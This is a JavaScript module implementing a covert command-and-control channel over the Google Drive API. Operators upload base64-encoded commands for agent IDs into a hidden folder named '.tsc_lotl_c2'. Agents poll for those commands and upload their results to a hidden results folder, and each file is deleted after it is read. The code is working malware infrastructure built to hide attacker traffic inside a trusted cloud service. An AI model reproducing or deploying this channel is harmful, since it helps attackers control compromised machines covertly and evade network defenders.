const https = require('https');
const crypto = require('crypto');

class GDrive {
  constructor(config) {
    this.accessToken = config.accessToken;
    this.serviceAccount = config.serviceAccount || null;
    this.folderName = config.folderName || '.tsc_lotl_c2';
    this.resultsFolderName = config.resultsFolderName || '.tsc_lotl_results';
    this.folderId = null;
    this.resultsFolderId = null;
    this.apiBase = 'www.googleapis.com';
  }

  _request(method, path, body, token) {
    return new Promise((resolve, reject) => {
      const opts = {
        hostname: this.apiBase,
        path,
        method,
        headers: {
          'Authorization': `Bearer ${token || this.accessToken}`,
          'Content-Type': 'application/json'
        }
      };

      const req = https.request(opts, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(parsed);
            } else {
              reject(new Error(`GDrive API error ${res.statusCode}: ${JSON.stringify(parsed)}`));
            }
          } catch (e) {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(data);
            } else {
              reject(new Error(`GDrive API error ${res.statusCode}: ${data}`));
            }
          }
        });
      });

      req.on('error', reject);
      if (body) req.write(JSON.stringify(body));
      req.end();
    });
  }

  async _ensureFolder(folderName, parentId) {
    const query = encodeURIComponent(`name='${folderName}' and mimeType='application/vnd.google-apps.folder'${parentId ? ` and '${parentId}' in parents` : ''} and trashed=false`);
    const search = await this._request('GET', `/drive/v3/files?q=${query}&fields=files(id,name)`, null);

    if (search.files && search.files.length > 0) {
      return search.files[0].id;
    }

    const meta = {
      name: folderName,
      mimeType: 'application/vnd.google-apps.folder'
    };
    if (parentId) meta.parents = [parentId];

    const created = await this._request('POST', '/drive/v3/files?fields=id', meta);
    return created.id;
  }

  async _getFolders() {
    if (!this.folderId) {
      this.folderId = await this._ensureFolder(this.folderName);
    }
    if (!this.resultsFolderId) {
      this.resultsFolderId = await this._ensureFolder(this.resultsFolderName, this.folderId);
    }
    return { cmd: this.folderId, results: this.resultsFolderId };
  }

  async sendCommand(agentId, b64Payload) {
    const folders = await this._getFolders();
    const timestamp = Date.now();
    const filename = `cmd_${agentId}_${timestamp}.json`;

    const fileContent = JSON.stringify({
      agentId,
      command: b64Payload,
      timestamp: new Date().toISOString()
    });

    const meta = {
      name: filename,
      parents: [folders.cmd],
      mimeType: 'application/json'
    };

    const boundary = 'boundary' + crypto.randomBytes(8).toString('hex');
    const body =
      `--${boundary}\r\n` +
      `Content-Type: application/json; charset=UTF-8\r\n\r\n` +
      `${JSON.stringify(meta)}\r\n` +
      `--${boundary}\r\n` +
      `Content-Type: application/json\r\n\r\n` +
      `${fileContent}\r\n` +
      `--${boundary}--`;

    return new Promise((resolve, reject) => {
      const opts = {
        hostname: this.apiBase,
        path: '/upload/drive/v3/files?uploadType=multipart&fields=id,name',
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.accessToken}`,
          'Content-Type': `multipart/related; boundary=${boundary}`,
          'Content-Length': Buffer.byteLength(body)
        }
      };

      const req = https.request(opts, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(parsed);
            } else {
              reject(new Error(`GDrive upload error ${res.statusCode}: ${JSON.stringify(parsed)}`));
            }
          } catch (e) {
            reject(new Error(`GDrive upload error: ${data}`));
          }
        });
      });
      req.on('error', reject);
      req.write(body);
      req.end();
    });
  }

  async pollCommands(agentId) {
    const folders = await this._getFolders();
    const query = encodeURIComponent(`'${folders.cmd}' in parents and name contains 'cmd_${agentId}' and trashed=false`);
    const list = await this._request('GET', `/drive/v3/files?q=${query}&fields=files(id,name)`, null);

    if (!list.files || list.files.length === 0) return [];

    const results = [];
    for (const file of list.files) {
      try {
        const content = await this._request('GET', `/drive/v3/files/${file.id}?alt=media`, null);
        const parsed = JSON.parse(content);
        results.push({
          id: file.id,
          agentId: parsed.agentId,
          command: parsed.command,
          timestamp: parsed.timestamp,
          fileId: file.id
        });

        await this._request('DELETE', `/drive/v3/files/${file.id}`, null);
      } catch (e) {
        // skip files that fail
      }
    }
    return results;
  }

  async sendResult(agentId, b64Payload) {
    const folders = await this._getFolders();
    const timestamp = Date.now();
    const filename = `result_${agentId}_${timestamp}.json`;

    const fileContent = JSON.stringify({
      agentId,
      result: b64Payload,
      timestamp: new Date().toISOString()
    });

    const meta = {
      name: filename,
      parents: [folders.results],
      mimeType: 'application/json'
    };

    const boundary = 'boundary' + crypto.randomBytes(8).toString('hex');
    const body =
      `--${boundary}\r\n` +
      `Content-Type: application/json; charset=UTF-8\r\n\r\n` +
      `${JSON.stringify(meta)}\r\n` +
      `--${boundary}\r\n` +
      `Content-Type: application/json\r\n\r\n` +
      `${fileContent}\r\n` +
      `--${boundary}--`;

    return new Promise((resolve, reject) => {
      const opts = {
        hostname: this.apiBase,
        path: '/upload/drive/v3/files?uploadType=multipart&fields=id,name',
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${this.accessToken}`,
          'Content-Type': `multipart/related; boundary=${boundary}`,
          'Content-Length': Buffer.byteLength(body)
        }
      };

      const req = https.request(opts, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(parsed);
            } else {
              reject(new Error(`GDrive upload error ${res.statusCode}: ${JSON.stringify(parsed)}`));
            }
          } catch (e) {
            reject(new Error(`GDrive upload error: ${data}`));
          }
        });
      });
      req.on('error', reject);
      req.write(body);
      req.end();
    });
  }

  async pollResults(agentId) {
    try {
      const folders = await this._getFolders();
      const query = encodeURIComponent(`'${folders.results}' in parents and trashed=false`);
      const list = await this._request('GET', `/drive/v3/files?q=${query}&fields=files(id,name)`, null);

      if (!list.files || list.files.length === 0) return [];

      const results = [];
      for (const file of list.files) {
        try {
          const content = await this._request('GET', `/drive/v3/files/${file.id}?alt=media`, null);
          const parsed = JSON.parse(content);
          results.push({
            id: file.id,
            agentId: parsed.agentId,
            result: parsed.result,
            timestamp: parsed.timestamp
          });
          await this._request('DELETE', `/drive/v3/files/${file.id}`, null);
        } catch (e) {
          // skip
        }
      }
      return results;
    } catch (e) {
      return [];
    }
  }

  async test() {
    try {
      await this._request('GET', '/drive/v3/about?fields=user', null);
      return true;
    } catch {
      return false;
    }
  }
}

module.exports = GDrive;
